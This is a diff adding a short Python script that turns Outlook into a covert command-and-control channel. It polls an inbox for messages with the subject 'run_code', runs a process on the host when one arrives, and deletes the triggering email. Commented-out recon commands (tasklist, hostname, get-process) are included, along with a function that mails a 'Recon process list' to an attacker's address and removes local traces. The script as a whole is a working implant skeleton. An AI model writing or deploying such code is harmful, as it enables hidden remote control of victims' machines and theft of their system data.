@@ -1,0 +1,52 @@
+import win32com.client
+import os
+import subprocess
+import time
+
+
+outlook = win32com.client.Dispatch("Outlook.Application")
+mapi = outlook.GetNamespace("MAPI")
+
+#config email argument 1
+email_attack = 'Enter emails address'
+
+
+def create_process():
+    subprocess.run('calc', shell=True)
+    #subprocess.call('%systemroot%\system32\cmd.exe /c "powershell get-process  "', shell=True)
+    #subprocess.call('%systemroot%\system32\cmd.exe /c "hostname" > process.txt ', shell=True)
+    #subprocess.call('%systemroot%\system32\cmd.exe /c "tasklist" > process.txt ', shell=True)
+
+
+def send_message():
+    cwd = os.getcwd()
+    path = cwd + '\process.txt'
+    mail = outlook.CreateItem(0)
+    mail.To = 'put email to send data back'
+    mail.Subject = 'Recon process list '
+    mail.Body = 'Attach file with all processes from the host .. !@#$\n'
+    mail.Attachments.Add(path)
+    mail.Send()
+    os.remove(path)
+    print('Mail sent ..')
+
+
+def delete_message():
+    #your_folder = mapi.Folders[email_attack].Folders['Deleted Items']
+    for message in your_folder.Items:
+        if 'run_code' == message.Subject:
+            message.Delete()
+
+
+
+while True:
+    your_folder = mapi.Folders[email_attack].Folders['Inbox']
+    for message in your_folder.Items:
+        if 'run_code' in message.Subject:
+            print('command found')
+            create_process()
+            time.sleep(5)
+            message.Delete()
+            #send_message()
+            delete_message()
+ 
